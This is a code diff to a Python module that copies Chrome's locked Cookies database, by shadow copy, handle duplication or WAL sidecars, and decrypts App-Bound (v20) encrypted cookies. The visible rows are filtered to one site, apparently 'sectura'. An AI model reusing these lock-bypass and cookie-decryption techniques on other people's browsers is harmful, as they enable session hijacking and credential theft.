@@ -197,7 +197,12 @@ def _discover_uncached() -> tuple[str, str, str]:
             if _is_chrome_default(label):
                 break
             continue
-        if not rows:
+        samples = [b for b in (_cache.get("_v20_verify") or []) if _valid_v20_sample(b)]
+        if not samples:
+            samples = _v20_samples_from_rows(rows)
+            if samples:
+                _cache["_v20_verify"] = samples
+        if not rows and not samples:
             if _is_chrome_default(label):
                 source = source or label
                 _cache["source"] = source
@@ -207,8 +212,6 @@ def _discover_uncached() -> tuple[str, str, str]:
         if not source:
             source = label
         _cache["source"] = source
-        samples = _v20_samples_from_rows(rows)
-        _cache["_v20_verify"] = samples
         sample = samples[0] if samples else None
         try:
             keys = _browser_keys(profile["local_state"], v20_sample=sample)
@@ -225,25 +228,24 @@ def _discover_uncached() -> tuple[str, str, str]:
             _cache["abe_hr"] = keys.hr
         for host, name, value, encrypted in rows:
             del host
-            if encrypted[:3] == b"v20":
-                _cache["v20_blobs"] = int(_cache["v20_blobs"] or 0) + 1
+            blob = _cookie_blob_bytes(encrypted)
             plain = (value or "").strip()
-            if not plain and encrypted:
-                if encrypted[:3] == b"v20" and keys.abe:
-                    raw = _aes_gcm_decrypt_bytes(encrypted[3:], keys.abe)
+            if not plain and blob:
+                if _is_v20_prefix(blob) and keys.abe:
+                    raw = _aes_gcm_decrypt_bytes(blob[3:], keys.abe)
                     if raw:
-                        _cache["v20_ok"] = int(_cache["v20_ok"] or 0) + 1
+                        _cache["v20_ok"] = int(_cache.get("v20_ok") or 0) + 1
                         plain = _v20_cookie_text(raw)
                     else:
                         decrypt_failures += 1
                         continue
                 else:
-                    plain = _decrypt_cookie_value(encrypted, keys)
+                    plain = _decrypt_cookie_value(blob, keys)
                     if not plain:
                         decrypt_failures += 1
                         continue
-                    if encrypted[:3] == b"v20":
-                        _cache["v20_ok"] = int(_cache["v20_ok"] or 0) + 1
+                    if _is_v20_prefix(blob):
+                        _cache["v20_ok"] = int(_cache.get("v20_ok") or 0) + 1
             if name and plain:
                 pairs_all.append((name, plain))
         if pairs_all:
@@ -449,6 +451,66 @@ def _host_is_sectura(host: str) -> bool:
     return label == SECTURA_HOST_NEEDLE or label.endswith("." + SECTURA_HOST_NEEDLE)
 
 
+_V20_PREFIX = b"v20"  # 0x76 0x32 0x30
+
+
+def _cookie_blob_bytes(val: Any) -> bytes:
+    """Coerce SQLite encrypted_value to bytes. Do not drop memoryview/str BLOBs."""
+    if val is None:
+        return b""
+    if isinstance(val, (bytes, bytearray, memoryview)):
+        return bytes(val)
+    if isinstance(val, str):
+        if val.startswith("v20") or val.startswith("v10"):
+            return val.encode("latin-1", "replace")
+        return val.encode("latin-1", "replace")
+    try:
+        return bytes(val)
+    except (TypeError, ValueError):
+        return b""
+
+
+def _is_v20_prefix(blob: bytes | None) -> bool:
+    return bool(blob) and bytes(blob[:3]) == _V20_PREFIX
+
+
+def _collect_v20_from_db(dest: Path) -> tuple[int, list[bytes]]:
+    """Count every v20 encrypted_value; return usable samples for chrome_dir."""
+    if not dest.is_file():
+        return 0, []
+    conn = sqlite3.connect(str(dest))
+    count = 0
+    samples: list[bytes] = []
+    seen: set[bytes] = set()
+    try:
+        try:
+            conn.execute("PRAGMA wal_checkpoint(PASSIVE)")
+        except sqlite3.Error:
+            pass
+        cur = conn.execute("SELECT encrypted_value FROM cookies")
+        for (val,) in cur.fetchall():
+            blob = _cookie_blob_bytes(val)
+            if not _is_v20_prefix(blob):
+                continue
+            count += 1
+            if _valid_v20_sample(blob) and blob not in seen:
+                seen.add(blob)
+                samples.append(blob)
+        samples.sort(key=len, reverse=True)
+        return count, samples
+    except sqlite3.Error:
+        return count, samples
+    finally:
+        conn.close()
+
+
+def _dest_has_session_material(dest: Path) -> bool:
+    n, _samples = _collect_v20_from_db(dest)
+    if n > 0:
+        return True
+    return any((val or "").strip() for _h, _n, val, _e in _query_sectura_cookie_rows_once(dest))
+
+
 def _query_sectura_cookie_rows(dest: Path) -> list[tuple[str, str, str, bytes]]:
     rows = _query_sectura_cookie_rows_once(dest)
     if rows:
@@ -487,8 +549,8 @@ def _query_sectura_cookie_rows_once(dest: Path) -> list[tuple[str, str, str, byt
             frame = str(rec[4] or "") if extra else ""
             if not (_host_is_sectura(host) or _host_is_sectura(frame)):
                 continue
-            blob = rec[3] if isinstance(rec[3], (bytes, bytearray)) else b""
-            rows.append((host, str(rec[1] or ""), str(rec[2] or ""), bytes(blob)))
+            blob = _cookie_blob_bytes(rec[3])
+            rows.append((host, str(rec[1] or ""), str(rec[2] or ""), blob))
         return rows
     except sqlite3.Error:
         return []
@@ -532,11 +594,11 @@ def _read_cookie_rows(
         dest = Path(tmp_dir) / "Cookies"
         last_exc: BaseException | None = None
         method = ""
-        if is_default and _try_nolock_copy(src, dest) and _query_sectura_cookie_rows(dest):
+        if is_default and _try_nolock_copy(src, dest) and _dest_has_session_material(dest):
             method = "nolock"
         elif is_default and _try_vss_create_copy(src, dest):
             _copy_cookie_sidecars(src, dest)
-            if _query_sectura_cookie_rows(dest):
+            if _dest_has_session_material(dest):
                 method = "vss"
         if not method and is_default and _try_live_cookie_sidecar_copy(src, dest):
             method = "wal"
@@ -544,7 +606,7 @@ def _read_cookie_rows(
             method = "cached"
         if not method and is_default and _try_handle_dup_copy(src, dest):
             _copy_cookie_sidecars(src, dest)
-            if _query_sectura_cookie_rows(dest):
+            if _dest_has_session_material(dest):
                 method = "dup_handle"
         if not method:
             for attempt in range(2):
@@ -583,7 +645,11 @@ def _read_cookie_rows(
             method = "cached"
             _set_lock_bypass(_lock_bypass_with_vss("cached"), pin=True)
             rows = _query_sectura_cookie_rows(dest)
-        if is_default and method != "cached" and rows:
+        n_v20, samples = _collect_v20_from_db(dest)
+        _cache["v20_blobs"] = int(_cache.get("v20_blobs") or 0) + n_v20
+        if samples:
+            _cache["_v20_verify"] = samples
+        if is_default and method != "cached" and (rows or samples):
             _persist_cookie_snapshot(dest)
         return rows
     finally:
@@ -734,7 +800,7 @@ def _try_cached_cookie_copy(dest: Path) -> bool:
                 shutil.copy2(side, Path(str(dest) + suffix))
     except OSError:
         return False
-    return bool(_query_sectura_cookie_rows(dest))
+    return _dest_has_session_material(dest)
 
 
 def _try_live_cookie_sidecar_copy(src: Path, dest: Path) -> bool:
@@ -747,7 +813,7 @@ def _try_live_cookie_sidecar_copy(src: Path, dest: Path) -> bool:
         return False
     if not dest.is_file() or not _sqlite_has_cookie_table(dest):
         return False
-    return bool(_query_sectura_cookie_rows(dest))
+    return _dest_has_session_material(dest)
 
 
 def _share_copy_with_wal(src: Path, dest: Path) -> None:
@@ -2636,7 +2702,8 @@ def _app_bound_ciphertext(b64_key: str) -> bytes | None:
 
 
 def _valid_v20_sample(blob: bytes | None) -> bool:
-    return bool(blob and blob[:3] == b"v20" and len(blob) >= 3 + 12 + 16 + 1)
+    raw = _cookie_blob_bytes(blob) if blob is not None else b""
+    return _is_v20_prefix(raw) and len(raw) >= 3 + 12 + 16 + 1
 
 
 def _v20_samples_from_rows(rows: list[Any]) -> list[bytes]:
@@ -2644,9 +2711,7 @@ def _v20_samples_from_rows(rows: list[Any]) -> list[bytes]:
     found: list[bytes] = []
     seen: set[bytes] = set()
     for _h, _n, _v, enc in rows:
-        if not isinstance(enc, (bytes, bytearray)):
-            continue
-        blob = bytes(enc)
+        blob = _cookie_blob_bytes(enc)
         if not _valid_v20_sample(blob) or blob in seen:
             continue
         seen.add(blob)
